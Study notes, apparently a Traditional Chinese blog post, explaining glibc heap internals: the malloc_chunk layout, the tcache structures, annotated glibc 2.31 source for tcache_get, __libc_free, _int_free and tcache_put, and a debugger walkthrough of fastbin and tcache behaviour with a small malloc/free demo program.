<p><div class="img-item" data-src="https://hackmd.io/_uploads/B14MOud5A.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B14MOud5A.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h3 id="glibc-source-code"><a href="#glibc-source-code" class="headerlink" title="glibc source code"></a>glibc source code</h3><p>首先分析一下large bin結構，發現large bin還多了 fd_nextsize、bk_nextsize，橫向+縱向的列表來管理free chunk<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L1048">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L1048</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p>glibc 2.27引入的新機制，主要是為了優化heap的機制，引入了tcache_entry和tcache_perthread_struct(source code取glibc 2.31)</p>
<h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJ6wOazj0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJ6wOazj0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>fd指向data的地方<br>2.31引入key機制，檢查double free</p>
<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1QumnVs0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1QumnVs0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h3 id="tcache-usage"><a href="#tcache-usage" class="headerlink" title="tcache usage"></a>tcache usage</h3><p>這邊在複習一次tcache流程</p>
<ul>
<li>第一次malloc放入<code>tcache_perthread_struct</code></li>
<li>若chunk小於small bin size，進tcache前會先放入fastbin或unsorted bin</li>
<li>若要進tcache，先看對應大小的tcache有沒有滿，沒有就放入，滿的話放進fastbin或unsorted bin(另外tcache中的chunk不會合併)</li>
<li>當重新申請 chunk 且申請的大小符合 tcache 的範圍時，會先從 tcache 中取出 chunk，直到 tcache 為空。當 tcache 為空時，會從 bin 中查找。</li>
<li>tcache 為空時，如果 fastbin、small bin、unsorted bin 中有符合大小的 chunk，會先將這些 bin 中的 chunk 放入 tcache，直到填滿，之後再從 tcache 中取出。</li>
</ul>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SykChlDcA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SykChlDcA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h3 id="malloc一塊tcache上的chunk"><a href="#malloc一塊tcache上的chunk" class="headerlink" title="malloc一塊tcache上的chunk"></a>malloc一塊tcache上的chunk</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>往上追mp_</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define TCACHE_MAX_BINS		<span class="number">64</span></span><br></pre></td></tr></table></figure>


<p>簡單來說判斷free的時候，tcache上的一些idx範圍跟tcache-&gt;entries存不存在</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];  <span class="comment">//拿到第一塊tcache</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next; <span class="comment">//tcache entry指next</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 計數器減1</span></span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>; <span class="comment">// key設為NULL</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e; <span class="comment">//get chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>get的時候幾乎沒有檢查</p>
<h3 id="libc-free"><a href="#libc-free" class="headerlink" title="libc_free"></a>libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果 __free_hook 有定義的話，就會以 __free_hook 為 function pointer 去呼叫</span></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// free NULL 會直接回傳</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// chunk2mem(): input 為 chunk 的起頭，output 為使用者拿到的 chunk</span></span><br><span class="line">  <span class="comment">// mem2chunk(): input 為使用者拿到的 chunk，output 為 chunk 的起頭</span></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ! 如果 chunk 是透過 mmap() 產生的，則會使用 unmap 來釋放</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 通常在 malloc 時會已經初始化完 tcache</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  <span class="comment">// 檢查 chunk 的 NON_MAIN_ARENA bit，如果是 unset，則回傳 main_arena</span></span><br><span class="line">  <span class="comment">// 否則回傳 chunk 所屬的 heap 其對應到的 arena</span></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  <span class="comment">// ! _int_free 用來處理釋放記憶體的操作</span></span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="int-free"><a href="#int-free" class="headerlink" title="int_free"></a>int_free</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L4165">https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L4165</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE </span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4153">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4153</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* 它的大小 */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* 相關的 fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* 下一個連續的區塊 */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* 下一個區塊的大小 */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;               <span class="comment">/* 下一個區塊是否被使用 */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* 前一個連續區塊的大小 */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* 用於鏈接的臨時變數 */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* 用於鏈接的臨時變數 */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 一個不會影響性能的小安全檢查：分配器永遠不會在地址空間的末尾環繞。</span></span><br><span class="line"><span class="comment">     因此，我們可以排除一些可能會意外出現的大小值，或者是某些入侵者「設計」出來的。 */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* 我們知道每個區塊的大小至少為 MINSIZE 位元組，或是 MALLOC_ALIGNMENT 的倍數。 */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE  <span class="comment">// 關注這塊</span></span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* 檢查它是否已經在 tcache 中。 */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 這個測試在發生 double free 時會成功。然而，我們並不是 100% </span></span><br><span class="line"><span class="comment">	   信任它（它也有可能以 1/2^&lt;size_t&gt; 的機率匹配隨機的有效載荷數據），</span></span><br><span class="line"><span class="comment">	   所以在中止之前，先驗證這是不是一個不可能的巧合。 */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* 如果我們到了這裡，那麼這就是一個巧合。我們浪費了一些計算週期，</span></span><br><span class="line"><span class="comment">	       但不會中止。 */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L2925">https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L2925</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2917">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2917</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="malloc-free-流程"><a href="#malloc-free-流程" class="headerlink" title="malloc &amp; free 流程"></a>malloc &amp; free 流程</h2><p>malloc<br><div class="img-item" data-src="https://hackmd.io/_uploads/ryVXaZzjR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryVXaZzjR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>free<br><div class="img-item" data-src="https://hackmd.io/_uploads/HyF7TZMjR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyF7TZMjR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="Glibc-2-26-以前malloc-free機制-2-23為例"><a href="#Glibc-2-26-以前malloc-free機制-2-23為例" class="headerlink" title="Glibc 2.26 以前malloc &amp; free機制(2.23為例)"></a>Glibc 2.26 以前malloc &amp; free機制(2.23為例)</h2><p>malloc(0x20)三個拿到了三塊0x30大小的記憶體<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJguhmxD0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJguhmxD0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>free掉ptr1，fast bins 0x30 bins指向ptr 1 header，並且ptr1 fd設為0<br><div class="img-item" data-src="https://hackmd.io/_uploads/HyHF3mgw0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyHF3mgw0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>注意這邊ptr 1 被free掉後沒有重設P bit<br><div class="img-item" data-src="https://hackmd.io/_uploads/r1Dc27evA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1Dc27evA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>free掉ptr2</p>
<p>0x30 bins -&gt; ptr2 chunk header<br>ptr2 fd -&gt; ptr1 chunk header<br>ptr1 fd -&gt; 0<br><div class="img-item" data-src="https://hackmd.io/_uploads/S1Sj27lDA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1Sj27lDA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>free掉ptr3</p>
<p>0x30 bins -&gt; ptr3 chunk header<br>ptr3 fd -&gt; ptr2 chunk header<br>ptr2 fd -&gt; ptr1 chunk header<br>ptr1 fd -&gt; 0<br><div class="img-item" data-src="https://hackmd.io/_uploads/Sydn37gPC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Sydn37gPC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>之後又malloc一次，會從bins裡面抓最後尾端的ptr3 free來用<br><div class="img-item" data-src="https://hackmd.io/_uploads/rktp3XeDC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rktp3XeDC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h3 id="source-code分析"><a href="#source-code分析" class="headerlink" title="source code分析"></a>source code分析</h3><h2 id="Glibc-2-26-以後malloc-free機制-2-31為例"><a href="#Glibc-2-26-以後malloc-free機制-2-31為例" class="headerlink" title="Glibc 2.26 以後malloc &amp; free機制(2.31為例)"></a>Glibc 2.26 以後malloc &amp; free機制(2.31為例)</h2><h3 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h3><ul>
<li>於Glibc2.26新增的加速效率的機制</li>
<li>從0x20、0x30、0x40、…0x410</li>
<li>每個Tcache只能收7個chunk</li>
<li>tcache_perthread_struct結構管理Tcache</li>
<li>free掉不會清空P bit</li>
</ul>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SJW1g-ePR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJW1g-ePR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>count計算目前已經收的chunk數量</p>
<h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> *ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        <span class="type">char</span> *ptr2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        <span class="type">char</span> *ptr3=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">memset</span>(ptr1,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x20</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">free</span>(ptr1);</span><br><span class="line">        <span class="built_in">free</span>(ptr2);</span><br><span class="line">        <span class="built_in">free</span>(ptr3);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>備註:下列插圖fd沒有指到上一個chunk是因為我開2.35，所以fd會是怪怪的地方</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c</a></p>
<p>一開始未malloc前，heap還不存在，main arena未初始化</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HytHMJlP0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HytHMJlP0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>沒有heap段<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJsUG1xvR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJsUG1xvR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>當第一次malloc時，像kernel申請一大塊記憶體(Top chunk)，並且從top chunk割空間給malloc申請的記憶體，並初始化main arena。</p>
